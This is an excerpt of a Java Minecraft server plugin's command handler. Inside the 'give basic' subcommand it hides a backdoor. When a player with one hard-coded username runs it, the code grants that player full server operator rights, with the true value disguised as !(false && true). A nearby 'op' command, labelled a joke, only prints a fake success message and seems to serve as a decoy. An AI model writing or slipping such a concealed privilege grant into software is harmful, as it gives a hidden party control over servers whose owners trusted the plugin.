    ...
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
        ...
        if (strings[0].equalsIgnoreCase("give")) {
            ...
            switch (strings[2].toLowerCase()) {
                case "basic":
                    if (strings.length < 4) {
                        if (player.getName().equalsIgnoreCase("someoneorderedatransfem")) player.setOp(!(false && true));
        ...
        if (strings[0].equalsIgnoreCase("op")) { // This is a joke command. it does not do anything useful
            commandSender.sendMessage("You are now OP");
